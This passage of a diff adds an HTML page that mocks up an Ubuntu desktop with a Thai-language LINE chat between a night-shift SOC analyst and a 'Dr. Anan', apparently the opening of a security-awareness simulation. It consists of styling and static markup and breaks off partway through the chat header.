@@ -1,0 +1,2171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ubuntu</title>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&family=Ubuntu+Mono:wght@400;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400&display=swap');
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background: #111;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-family: 'Ubuntu', 'Segoe UI', sans-serif;
+      padding-top: 30px;
+    }
+
+    .ubuntu-screen {
+      font-family: 'Ubuntu', 'Segoe UI', sans-serif;
+      background: #3e1f4e;
+      border-radius: 10px;
+      overflow: hidden;
+      width: 960px;
+      min-height: 660px;
+      position: relative;
+      user-select: none;
+      box-shadow: 0 30px 90px rgba(0,0,0,0.55);
+    }
+
+    .wallpaper-overlay {
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(ellipse at 15% 15%, rgba(255,100,50,0.28) 0%, transparent 45%),
+        radial-gradient(ellipse at 85% 70%, rgba(100,20,160,0.38) 0%, transparent 40%),
+        radial-gradient(ellipse at 50% 50%, rgba(80,10,100,0.2) 0%, transparent 60%),
+        linear-gradient(145deg, #1f0a2e 0%, #4a1060 40%, #c83800 100%);
+    }
+
+    /* TOP BAR */
+    .topbar {
+      position: relative;
+      z-index: 10;
+      height: 26px;
+      background: rgba(15,10,20,0.88);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 10px;
+      font-size: 12px;
+      color: rgba(255,255,255,0.88);
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+
+    .topbar-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .topbar-left span {
+      font-size: 12px;
+      opacity: 0.85;
+    }
+
+    .topbar-left .activities-btn {
+      font-size: 12px;
+      font-weight: 500;
+      background: rgba(255,255,255,0.07);
+      padding: 1px 8px;
+      border-radius: 3px;
+    }
+
+    .topbar-center {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 12.5px;
+      font-weight: 400;
+      opacity: 0.92;
+      letter-spacing: 0.01em;
+    }
+
+    .topbar-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 12px;
+      opacity: 0.88;
+    }
+
+    .status-icon {
+      display: flex;
+      align-items: center;
+      gap: 3px;
+      font-size: 11px;
+    }
+
+    .wifi-bars {
+      display: flex;
+      align-items: flex-end;
+      gap: 1.5px;
+      height: 10px;
+    }
+
+    .wifi-bars span {
+      width: 2.5px;
+      background: rgba(255,255,255,0.85);
+      border-radius: 1px;
+    }
+
+    .battery-icon {
+      display: flex;
+      align-items: center;
+      gap: 3px;
+      font-size: 11px;
+    }
+
+    .battery-body {
+      width: 18px;
+      height: 9px;
+      border: 1.5px solid rgba(255,255,255,0.8);
+      border-radius: 2px;
+      position: relative;
+      display: flex;
+      align-items: center;
+      padding: 1px;
+    }
+
+    .battery-body::after {
+      content: '';
+      position: absolute;
+      right: -4px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 2px;
+      height: 4px;
+      background: rgba(255,255,255,0.7);
+      border-radius: 0 1px 1px 0;
+    }
+
+    .battery-fill {
+      height: 100%;
+      width: 72%;
+      background: #4ade80;
+      border-radius: 1px;
+    }
+
+    /* DOCK */
+    .dock {
+      position: absolute;
+      left: 0;
+      top: 26px;
+      bottom: 0;
+      width: 60px;
+      background: rgba(18,12,28,0.7);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border-right: 1px solid rgba(255,255,255,0.05);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 14px 0 14px;
+      gap: 6px;
+      z-index: 5;
+    }
+
+    .dock-profile-avatar {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      background: #8b5cf6;
+      color: white;
+      font-size: 13px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 2px;
+    }
+
+    .dock-divider {
+      width: 32px;
+      height: 1px;
+      background: rgba(255,255,255,0.12);
+      margin: 2px 0;
+    }
+
+    .dock-item {
+      position: relative;
+      width: 44px;
+      height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+    }
+
+    .dock-item:hover {
+      transform: scale(1.08);
+    }
+
+    .dock-item.active::before {
+      content: '';
+      position: absolute;
+      left: -8px;
+      width: 3px;
+      height: 28px;
+      background: rgba(255,255,255,0.85);
+      border-radius: 0 2px 2px 0;
+    }
+
+    .dock-item.active .dock-icon-inner {
+      transform: scale(1.2);
+      transition: transform 0.2s ease;
+    }
+
+    .dock-item.active.line-icon .line-text {
+      font-size: 9px;
+      transition: font-size 0.2s ease;
+    }
+
+    .dock-item.active.line-icon {
+      transform: scale(1.1);
+      transition: transform 0.2s ease;
+    }
+
+    .dock-item.line-icon {
+      background: transparent;
+    }
+
+    .line-text {
+      color: white;
+      font-weight: 700;
+      font-size: 11px;
+      letter-spacing: -0.3px;
+      transition: transform 0.2s ease;
+    }
+
+    .dock-icon-inner {
+      width: 26px;
+      height: 26px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .files-icon {
+      background: linear-gradient(135deg, #f59e0b, #d97706);
+    }
+
+    .terminal-icon {
+      background: #1a1a2e;
+      border: 1px solid rgba(255,255,255,0.15);
+    }
+
+    .settings-icon {
+      background: #374151;
+    }
+
+    .firefox-icon {
+      background: linear-gradient(135deg, #e25a00, #ff9400);
+    }
+
+    .dock-badge {
+      position: absolute;
+      top: 3px;
+      right: 3px;
+      min-width: 14px;
+      height: 14px;
+      padding: 0 4px;
+      border-radius: 999px;
+      background: #ef4444;
+      color: white;
+      font-size: 9px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1.5px solid rgba(18,12,28,0.9);
+    }
+
+    /* WINDOW */
+    .line-window {
+      position: absolute;
+      left: 88px;
+      top: 48px;
+      width: 820px;
+      height: 570px;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow:
+        0 2px 0 rgba(255,255,255,0.06) inset,
+        0 32px 80px rgba(0,0,0,0.65),
+        0 0 0 1px rgba(255,255,255,0.08);
+      z-index: 6;
+      background: #fff;
+    }
+
+    .window-titlebar {
+      height: 36px;
+      background: #252525;
+      display: flex;
+      align-items: center;
+      padding: 0 10px;
+      gap: 7px;
+      border-bottom: 1px solid rgba(0,0,0,0.4);
+    }
+
+    .drag-handle {
+      cursor: grab;
+    }
+
+    .drag-handle:active {
+      cursor: grabbing;
+    }
+
+    .app-window.dragging {
+      box-shadow:
+        0 2px 0 rgba(255,255,255,0.06) inset,
+        0 36px 100px rgba(0,0,0,0.72),
+        0 0 0 1px rgba(255,255,255,0.1);
+    }
+
+    .terminal-window {
+      display: none;
+      position: absolute;
+      left: 88px;
+      top: 48px;
+      width: 820px;
+      height: 570px;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow:
+        0 2px 0 rgba(255,255,255,0.06) inset,
+        0 32px 80px rgba(0,0,0,0.65),
+        0 0 0 1px rgba(255,255,255,0.08);
+      z-index: 8;
+      background: radial-gradient(circle at 15% 15%, #3f1a42 0%, #250f2f 35%, #190d24 100%);
+    }
+
+    .terminal-titlebar {
+      background: #2a2a2a;
+    }
+
+    .terminal-content {
+      padding: 12px 15px;
+      color: #e0e0e0;
+      font-family: 'Ubuntu Mono', 'Courier New', monospace;
+      font-size: 13px;
+      line-height: 1.45;
+      height: calc(100% - 36px - 28px);
+      overflow-x: auto;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      background:
+        linear-gradient(180deg, rgba(255,255,255,0.02), transparent 30%),
+        repeating-linear-gradient(0deg, rgba(255,255,255,0.03), rgba(255,255,255,0.03) 1px, transparent 1px, transparent 23px);
+    }
+
+    .term-line {
+      min-height: 1.25em;
+    }
+
+    .term-line.command {
+      color: #e8e8e8;
+    }
+
+    .term-prompt-user {
+      color: #8be9fd;
+    }
+
+    .term-prompt-path {
+      color: #f1fa8c;
+    }
+
+    .term-line.command .term-cmd {
+      color: #f8f8f2;
+    }
+
+    .term-line.system {
+      color: #a1a1aa;
+    }
+
+    .term-line.warn {
+      color: #f59e0b;
+    }
+
+    .term-line.alert {
+      color: #fb7185;
+    }
+
+    .term-line.good {
+      color: #86efac;
+    }
+
+    .term-cursor {
+      display: inline-block;
+      width: 8px;
+      height: 1em;
+      background: #4ade80;
+      transform: translateY(2px);
+      animation: cursorBlink 1.05s steps(2, start) infinite;
+      margin-left: 2px;
+    }
+
+    @keyframes cursorBlink {
+      0%, 48% {
+        opacity: 1;
+      }
+
+      50%, 100% {
+        opacity: 0;
+      }
+    }
+
+    .terminal-statusbar {
+      height: 28px;
+      background: #1b1b1b;
+      border-top: 1px solid rgba(255,255,255,0.05);
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      gap: 15px;
+    }
+
+    .terminal-statusbar span {
+      font-size: 11px;
+      color: rgba(255,255,255,0.5);
+    }
+
+    .terminal-statusbar .muted {
+      color: rgba(255,255,255,0.3);
+    }
+
+    .material-symbols-outlined {
+      font-family: 'Material Symbols Outlined';
+      font-weight: normal;
+      font-style: normal;
+      font-size: 22px;
+      line-height: 1;
+      letter-spacing: normal;
+      text-transform: none;
+      display: inline-block;
+      white-space: nowrap;
+      word-wrap: normal;
+      direction: ltr;
+      -webkit-font-smoothing: antialiased;
+      font-variation-settings: 'FILL' 1, 'wght' 500, 'GRAD' 0, 'opsz' 24;
+    }
+
+    .ubuntu-alert-backdrop {
+      display: none;
+      position: absolute;
+      inset: 0;
+      background: rgba(16, 12, 22, 0.5);
+      z-index: 280;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .ubuntu-alert {
+      width: 410px;
+      background: #2b2b2f;
+      border-radius: 12px;
+      box-shadow: 0 30px 60px rgba(0,0,0,0.45);
+      border: 1px solid rgba(255,255,255,0.09);
+      overflow: hidden;
+      animation: ubuntuAlertIn 0.22s ease-out;
+    }
+
+    @keyframes ubuntuAlertIn {
+      from {
+        transform: translateY(10px) scale(0.96);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0) scale(1);
+        opacity: 1;
+      }
+    }
+
+    .ubuntu-alert-header {
+      height: 34px;
+      background: #1f1f22;
+      color: rgba(255,255,255,0.84);
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      font-size: 12px;
+      border-bottom: 1px solid rgba(0,0,0,0.35);
+    }
+
+    .ubuntu-alert-body {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 18px 16px 16px;
+      color: #efefef;
+    }
+
+    .ubuntu-alert-icon {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: #db6a00;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      border: 1px solid rgba(255,255,255,0.12);
+      margin-top: 1px;
+    }
+
+    .ubuntu-alert-title {
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 5px;
+      color: #ffffff;
+    }
+
+    .ubuntu-alert-text {
+      font-size: 13px;
+      line-height: 1.4;
+      color: #d9d9dd;
+    }
+
+    .ubuntu-alert-actions {
+      padding: 0 16px 14px;
+      display: flex;
+      justify-content: flex-end;
+    }
+
+    .ubuntu-alert-btn {
+      min-width: 78px;
+      height: 31px;
+      border-radius: 7px;
+      border: 1px solid #d66a00;
+      background: linear-gradient(#ff8c1a, #db6a00);
+      color: white;
+      font-family: 'Ubuntu', sans-serif;
+      font-size: 12.5px;
+      cursor: pointer;
+      box-shadow: 0 1px 0 rgba(255,255,255,0.25) inset;
+    }
+
+    .ubuntu-alert-btn:hover {
+      filter: brightness(1.06);
+    }
+
+    .wctl {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      position: relative;
+      cursor: default;
+    }
+
+    .wctl-close {
+      background: #ff5f57;
+      border: 1px solid rgba(0,0,0,0.15);
+    }
+
+    .wctl-min {
+      background: #febc2e;
+      border: 1px solid rgba(0,0,0,0.12);
+    }
+
+    .wctl-max {
+      background: #28c840;
+      border: 1px solid rgba(0,0,0,0.12);
+    }
+
+    .ubuntu-win-btn {
+      background: transparent;
+      border: none;
+      color: rgba(255,255,255,0.7);
+      font-size: 14px;
+      width: 28px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      border-radius: 4px;
+      transition: background 0.15s;
+      font-family: 'Ubuntu', sans-serif;
+    }
+
+    .ubuntu-win-btn:hover {
+      background: rgba(255,255,255,0.1);
+    }
+
+    .ubuntu-win-btn-close:hover {
+      background: #e74c3c;
+      color: white;
+    }
+
+    .win-title {
+      margin-left: 6px;
+      font-size: 12.5px;
+      color: rgba(255,255,255,0.75);
+      font-weight: 400;
+    }
+
+    /* LINE layout */
+    .line-layout {
+      display: grid;
+      grid-template-columns: 68px 235px 1fr;
+      height: calc(570px - 36px);
+      background: #fff;
+    }
+
+    /* Sidebar */
+    .line-sidebar {
+      width: 68px;
+      background: #f7f7f7;
+      border-right: 1px solid #e0e0e0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 12px 0;
+      gap: 8px;
+    }
+
+    .sidebar-nav-item {
+      width: 44px;
+      height: 44px;
+      border-radius: 10px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+      cursor: default;
+      position: relative;
+    }
+
+    .sidebar-nav-item.active {
+      background: rgba(6,199,85,0.1);
+    }
+
+    .sidebar-nav-label {
+      font-size: 8.5px;
+      color: #888;
+      letter-spacing: 0.01em;
+    }
+
+    .sidebar-nav-item.active .sidebar-nav-label {
+      color: #06c755;
+      font-weight: 500;
+    }
+
+    /* Chat list column */
+    .chat-list-col {
+      width: 235px;
+      border-right: 1px solid #e8e8e8;
+      display: flex;
+      flex-direction: column;
+      min-width: 0;
+    }
+
+    .chat-list-header {
+      padding: 12px 10px 8px;
+      border-bottom: 1px solid #efefef;
+    }
+
+    .chat-list-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111;
+      margin: 0 0 8px;
+    }
+
+    .search-bar {
+      background: #f0f0f0;
+      border-radius: 18px;
+      padding: 5px 10px;
+      font-size: 11.5px;
+      color: #999;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .chat-list-items {
+      flex: 1;
+      overflow: hidden;
+    }
+
+    .chat-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 10px;
+      border-bottom: 1px solid #f5f5f5;
+      cursor: default;
+    }
+
+    .chat-item.selected {
+      background: #e8f8f0;
+    }
+
+    .chat-item-avatar {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+      color: white;
+    }
+
+    .chat-item-info {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .chat-item-name {
+      font-size: 12px;
+      font-weight: 600;
+      color: #111;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .chat-item-preview {
+      font-size: 10.5px;
+      color: #888;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      margin-top: 1px;
+    }
+
+    .chat-item-meta {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 3px;
+      flex-shrink: 0;
+    }
+
+    .chat-item-time {
+      font-size: 9.5px;
+      color: #aaa;
+    }
+
+    .unread-badge {
+      background: #06c755;
+      color: white;
+      font-size: 9px;
+      font-weight: 700;
+      min-width: 15px;
+      height: 15px;
+      padding: 0 4px;
+      border-radius: 999px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Chat main */
+    .chat-main {
+      min-width: 0;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .chat-header-bar {
+      height: 54px;
+      background: #06c755;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 0 12px;
+      flex-shrink: 0;
+    }
+
+    .chat-header-avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.2);
+      color: white;
+      font-size: 14px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid rgba(255,255,255,0.35);
+    }
+
+    .chat-header-info {
+      flex: 1;
+    }
+
+    .chat-header-name {
+      font-size: 14px;
+      font-weight: 700;
+      color: white;
+      line-height: 1.2;
+    }
+
+    .chat-header-sub {
+      font-size: 10.5px;
+      color: rgba(255,255,255,0.82);
+      margin-top: 1px;
+    }
+
+    .chat-header-actions {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .header-action-btn {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Messages */
+    .messages-area {
+      flex: 1;
+      background: #8bb5d8;
+      padding: 14px 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      overflow: hidden;
+    }
+
+    .date-chip {
+      align-self: center;
+      background: rgba(0,0,0,0.2);
+      color: rgba(255,255,255,0.92);
+      font-size: 10px;
+      padding: 3px 10px;
+      border-radius: 10px;
+      margin-bottom: 2px;
+    }
+
+    .msg-row {
+      display: flex;
+      align-items: flex-end;
+      gap: 6px;
+      animation: popIn 0.18s ease-out;
+    }
+
+    .msg-row.from-user {
+      justify-content: flex-end;
+    }
+
+    .msg-row.from-user .msg-time-label {
+      order: -1;
+    }
+
+    @keyframes popIn {
+      from {
+        transform: translateY(4px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .msg-row-avatar {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: #06c755;
+      color: white;
+      font-size: 9px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .msg-bubble {
+      max-width: 350px;
+      background: white;
+      padding: 8px 10px;
+      border-radius: 14px 14px 14px 3px;
+      font-size: 12.5px;
+      color: #111;
+      line-height: 1.4;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+    }
+
+    .msg-bubble.urgent {
+      border-left: 2.5px solid #ef4444;
+      border-radius: 14px 14px 14px 3px;
+    }
+
+    .from-user .msg-bubble {
+      background: #dcf8c6;
+      border-radius: 14px 14px 3px 14px;
+    }
+
+    .msg-time-label {
+      font-size: 9.5px;
+      color: rgba(255,255,255,0.7);
+      align-self: flex-end;
+      flex-shrink: 0;
+      margin-bottom: 2px;
+    }
+
+    .typing-indicator {
+      display: flex;
+      align-items: flex-end;
+      gap: 6px;
+    }
+
+    .typing-avatar {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: #06c755;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 9px;
+      font-weight: 700;
+      color: white;
+    }
+
+    .typing-dots {
+      background: white;
+      padding: 8px 12px;
+      border-radius: 14px 14px 14px 3px;
+      display: flex;
+      gap: 4px;
+      align-items: center;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+    }
+
+    .typing-dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: #bbb;
+      animation: tdot 1.2s ease-in-out infinite;
+    }
+
+    .typing-dot:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .typing-dot:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes tdot {
+      0%, 80%, 100% {
+        transform: scale(0.75);
+        opacity: 0.5;
+      }
+
+      40% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    /* Input area */
+    .chat-input-area {
+      border-top: 1px solid #e8e8e8;
+      background: #fafafa;
+      padding: 8px 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
+      flex-shrink: 0;
+    }
+
+    .reply-options {
+      display: none;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+
+    .reply-options.visible {
+      display: flex;
+    }
+
+    .reply-option {
+      border: 1px solid rgba(6,199,85,0.35);
+      background: #f4fff8;
+      color: #056c32;
+      border-radius: 999px;
+      padding: 6px 10px;
+      font-size: 11px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: inherit;
+      transition: 0.12s ease;
+    }
+
+    .reply-option:hover {
+      background: #06c755;
+      color: white;
+    }
+
+    .reply-option:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    .input-row {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+
+    .input-box {
+      flex: 1;
+      background: #f2f2f2;
+      border-radius: 18px;
+      padding: 7px 12px;
+      font-size: 12px;
+      color: #bbb;
+      display: flex;
+      align-items: center;
+    }
+
+    .input-box.ready {
+      color: #777;
+    }
+
+    .input-actions {
+      display: flex;
+      gap: 6px;
+      align-items: center;
+    }
+
+    .input-btn {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: rgba(0,0,0,0.06);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .send-btn {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #06c755;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    @media (max-width: 980px) {
+      .ubuntu-screen {
+        width: 100vw;
+        border-radius: 0;
+      }
+
+      .line-window {
+        width: calc(100vw - 104px);
+        left: 76px;
+      }
+
+      .line-layout {
+        grid-template-columns: 58px 210px 1fr;
+      }
+
+      .line-sidebar {
+        width: 58px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="ubuntu-screen">
+    <div class="wallpaper-overlay"></div>
+
+    <div class="topbar">
+      <div class="topbar-left">
+        <span class="activities-btn">Activities</span>
+      </div>
+
+      <div class="topbar-center">Fri 24 Apr&nbsp;&nbsp;&nbsp;02:18</div>
+
+      <div class="topbar-right">
+        <div class="status-icon">
+          <div class="wifi-bars">
+            <span style="height:3px"></span>
+            <span style="height:5px"></span>
+            <span style="height:7px"></span>
+            <span style="height:10px"></span>
+          </div>
+        </div>
+
+        <div class="status-icon" style="gap:4px;font-size:11px;opacity:0.85">
+          🔊 100%
+        </div>
+
+        <div class="battery-icon">
+          <div class="battery-body">
+            <div class="battery-fill"></div>
+          </div>
+          <span style="font-size:11px;color:rgba(255,255,255,0.8)">72%</span>
+        </div>
+      </div>
+    </div>
+
+    <aside class="dock">
+      <div class="dock-profile-avatar">SOC</div>
+      <div class="dock-divider"></div>
+
+      <div class="dock-item line-icon active" id="lineDockItem" style="cursor:pointer;">
+        <div class="dock-icon-inner" style="background: #06c755;">
+          <span class="line-text">LINE</span>
+        </div>
+        <div class="dock-badge" id="dockBadge">0</div>
+      </div>
+
+      <div class="dock-item" id="orbDockItem" style="cursor:pointer;">
+        <div class="dock-icon-inner firefox-icon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="10" fill="#e25a00"/>
+            <circle cx="12" cy="12" r="5" fill="#ff9400"/>
+            <circle cx="12" cy="12" r="2.5" fill="#fff"/>
+          </svg>
+        </div>
+      </div>
+
+      <div class="dock-item" id="filesDockItem" style="cursor:pointer;">
+        <div class="dock-icon-inner files-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="white">
+            <path d="M3 6h18v13a2 2 0 01-2 2H5a2 2 0 01-2-2V6zm0 0V4a1 1 0 011-1h5l2 2h8a1 1 0 011 1v1"/>
+          </svg>
+        </div>
+      </div>
+
+      <div class="dock-item" id="terminalDockItem" style="cursor:pointer;">
+        <div class="dock-icon-inner terminal-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2">
+            <polyline points="4 17 10 11 4 5"/>
+            <line x1="12" y1="19" x2="20" y2="19"/>
+          </svg>
+        </div>
+      </div>
+
+      <div style="flex:1"></div>
+
+      <div class="dock-item" id="settingsDockItem" style="cursor:pointer;">
+        <div class="dock-icon-inner settings-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2">
+            <circle cx="12" cy="12" r="3"/>
+            <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
+          </svg>
+        </div>
+      </div>
+    </aside>
+
+    <div id="lineWindow" class="line-window app-window">
+      <div class="window-titlebar drag-handle">
+        <span class="win-title">LINE — Dr. Anan</span>
+        <div style="flex:1"></div>
+        <button class="ubuntu-win-btn ubuntu-win-btn-min">─</button>
+        <button class="ubuntu-win-btn ubuntu-win-btn-max">☐</button>
+        <button class="ubuntu-win-btn ubuntu-win-btn-close">✕</button>
+      </div>
+
+      <div class="line-layout">
+        <div class="line-sidebar">
+          <div class="sidebar-nav-item active">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="#06c755">
+              <path d="M20 2H4a2 2 0 00-2 2v14a2 2 0 002 2h3l3 3 3-3h5a2 2 0 002-2V4a2 2 0 00-2-2z"/>
+            </svg>
+            <span class="sidebar-nav-label" style="color:#06c755">แชท</span>
+          </div>
+
+          <div class="sidebar-nav-item">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+              <circle cx="12" cy="8" r="4"/>
+              <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
+            </svg>
+            <span class="sidebar-nav-label">เพื่อน</span>
+          </div>
+
+          <div class="sidebar-nav-item">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+              <circle cx="12" cy="12" r="10"/>
+              <polyline points="12 6 12 12 16 14"/>
+            </svg>
+            <span class="sidebar-nav-label">ไทม์ไลน์</span>
+          </div>
+
+          <div class="sidebar-nav-item">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+              <circle cx="11" cy="11" r="8"/>
+              <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+            </svg>
+            <span class="sidebar-nav-label">ค้นหา</span>
+          </div>
+        </div>
+
+        <div class="chat-list-col">
+          <div class="chat-list-header">
+            <div class="chat-list-title">แชท</div>
+
+            <div class="search-bar">
+              <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="2.5">
+                <circle cx="11" cy="11" r="8"/>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+              </svg>
+              <span>ค้นหา</span>
+            </div>
+          </div>
+
+          <div class="chat-list-items">
+            <div class="chat-item selected">
+              <div class="chat-item-avatar" style="background:#06c755">ด</div>
+
+              <div class="chat-item-info">
+                <div class="chat-item-name">Dr. Anan</div>
+                <div class="chat-item-preview" id="doctorPreview">รอข้อความ...</div>
+              </div>
+
+              <div class="chat-item-meta">
+                <span class="chat-item-time" id="doctorChatTime">02:18</span>
+                <span class="unread-badge" id="chatUnread">0</span>
+              </div>
+            </div>
+
+            <div class="chat-item">
+              <div class="chat-item-avatar" style="background:#8b5cf6">SOC</div>
+
+              <div class="chat-item-info">
+                <div class="chat-item-name">SOC Analyst</div>
+                <div class="chat-item-preview">คุณอยู่เวร</div>
+              </div>
+
+              <div class="chat-item-meta">
+                <span class="chat-item-time">ออนไลน์</span>
+              </div>
+            </div>
+
+            <div class="chat-item">
+              <div class="chat-item-avatar" style="background:#f59e0b">IT</div>
+
+              <div class="chat-item-info">
+                <div class="chat-item-name">IT Infrastructure</div>
+                <div class="chat-item-preview">สำรองข้อมูล DB เสร็จแล้ว ✓</div>
+              </div>
+
+              <div class="chat-item-meta">
+                <span class="chat-item-time">00:33</span>
+              </div>
+            </div>
+
+            <div class="chat-item">
+              <div class="chat-item-avatar" style="background:#3b82f6">N</div>
+
+              <div class="chat-item-info">
+                <div class="chat-item-name">Nurse Patchara</div>
+                <div class="chat-item-preview">ช่วยตรวจหอผู้ป่วย 3 ด้วยได้ไหม</div>
+              </div>
+
+              <div class="chat-item-meta">
+                <span class="chat-item-time">เมื่อวาน</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="chat-main">
+          <div class="chat-header-bar">
+            <div class="chat-header-avatar">ด</div>
+
+            <div class="chat-header-info">
+              <div class="chat-header-name">Dr. Anan</div>
+              <div class="chat-header-sub" id="doctorStatus">ออนไลน์</div>
+            </div>
+
+            <div class="chat-header-actions">
+              <div class="header-action-btn">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5">
